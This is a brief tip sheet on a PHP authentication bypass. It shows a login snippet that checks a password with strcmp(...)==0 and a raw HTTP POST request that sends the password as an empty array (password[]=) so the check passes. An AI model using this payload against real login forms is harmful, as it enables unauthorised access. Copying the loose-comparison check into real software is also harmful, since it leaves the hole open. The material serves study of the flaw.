# PHP Bypass Tips

## The PHP strcmp Function

According to the PHP manual, the `strcmp` function returns the following values:

&lt; 0 if str1 is less than str2;

&gt; 0 if str1 is greater than str2,

and 0 if they are equal.

```text
<?php
    if(isset($_POST['password']))
    {   $password = $_POST['password'];
        if(strcmp($password, $actual_password)==0)
        {
            echo "YOU WON!";
        }
    }
?>
```

However, it is possible to manipulate the results of the strcmp function execution:

_Input as an Array_

Request:

```text
POST / HTTP/1.1
Host: reverse-shell.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

password[]=
```

```text
strcmp($secret, $_POST['password']) returns 0
```
